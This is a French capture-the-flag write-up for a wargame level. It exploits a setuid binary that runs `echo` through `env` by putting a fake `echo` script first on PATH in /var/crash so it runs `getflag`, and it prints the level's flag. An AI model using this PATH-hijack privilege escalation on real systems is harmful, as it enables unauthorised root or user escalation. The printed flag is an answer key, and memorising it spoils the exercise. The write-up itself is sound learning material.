# LEVEL 03

1. Un simple `ls -l` pour voir ce qu'il y a:
```
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03
```
C'est un binary avec des [sticky rigths](https://www.redhat.com/sysadmin/suid-sgid-sticky-bit)

2. On test `./level03`:
```
Exploit me
```
Humm ok then!

3. On check ce qu'il se passe dans ce binaire avec la [commande string](https://www.javatpoint.com/linux-strings-command#:~:text=Linux%20strings%20command%20is%20used,text%20from%20an%20executable%20file.)
```
strings level03
strings level03 | grep "Exploit me"
```
```
/usr/bin/env echo Exploit me
```
4. Le fichier a les sticky rights du flag04, on va donc essayer de lui faire `echo` autre chose, genre ...`getflag`
5. Il faut trouver un dossier où notre user actuel a les droits de creer un fichier. On trouve: `/var/crash/`
6. On va creer une fausse commande `echo` pour remplacer l'ancienne (cf [Linux env command](https://www.computerhope.com/unix/uenv.htm#:~:text=env%20is%20a%20shell%20command,without%20modifying%20the%20current%20one.)):
```
which getflag
export PATH=/var/crash:$PATH
echo "getflag > /var/crash/flag" > /var/crash/echo
chmod +x /var/crash/echo
./level03
cat /var/crash/flag
```
## ⚡ Flag
`qi0maab88jeaj46qoumi7maus`
